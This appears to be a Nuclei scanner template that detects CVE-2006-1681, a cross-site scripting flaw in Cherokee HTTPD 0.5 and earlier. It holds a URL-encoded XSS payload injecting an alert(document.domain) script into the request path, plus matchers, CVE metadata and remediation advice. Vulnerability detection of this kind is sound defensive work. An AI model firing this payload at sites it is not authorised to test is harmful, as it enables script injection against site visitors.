flow: http(1) && http(2)
http:
- host-redirects: true
  matchers:
  - case-insensitive: true
    internal: true
    type: word
    words:
    - Cherokee
  max-redirects: 2
  method: GET
  path:
  - '{{BaseURL}}'
- matchers:
  - type: word
    words:
    - </script><script>alert(document.domain)</script>
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/%2F..%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
id: CVE-2006-1681
info:
  author: geeknik
  classification:
    cpe: cpe:2.3:a:cherokee:cherokee_httpd:0.1:*:*:*:*:*:*:*
    cve-id: CVE-2006-1681
    cvss-metrics: CVSS:2.0/AV:N/AC:M/Au:N/C:N/I:P/A:N
    cvss-score: 4.3
    cwe-id: NVD-CWE-Other
    epss-percentile: 0.52862
    epss-score: 0.00299
  description: Cherokee HTTPD 0.5 and earlier contains a cross-site scripting vulnerability
    which allows remote attackers to inject arbitrary web script or HTML via a malformed
    request that generates an HTTP 400 error, which is not properly handled when the
    error message is generated.
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary script code in the context of the victim''s browser, potentially
    leading to session hijacking, defacement, or theft of sensitive information.

    '
  metadata:
    max-request: 1
    product: cherokee_httpd
    vendor: cherokee
  name: Cherokee HTTPD <=0.5 - Cross-Site Scripting
  reference:
  - http://www.vupen.com/english/advisories/2006/1292
  - https://nvd.nist.gov/vuln/detail/CVE-2006-1681
  - https://exchange.xforce.ibmcloud.com/vulnerabilities/25698
  - https://security.gentoo.org/glsa/202012-09
  remediation: 'Upgrade to a patched version of Cherokee HTTPD or apply the necessary
    security patches to mitigate the XSS vulnerability.

    '
  severity: medium
  tags: cve,cve2006,cherokee,httpd,xss,vuln
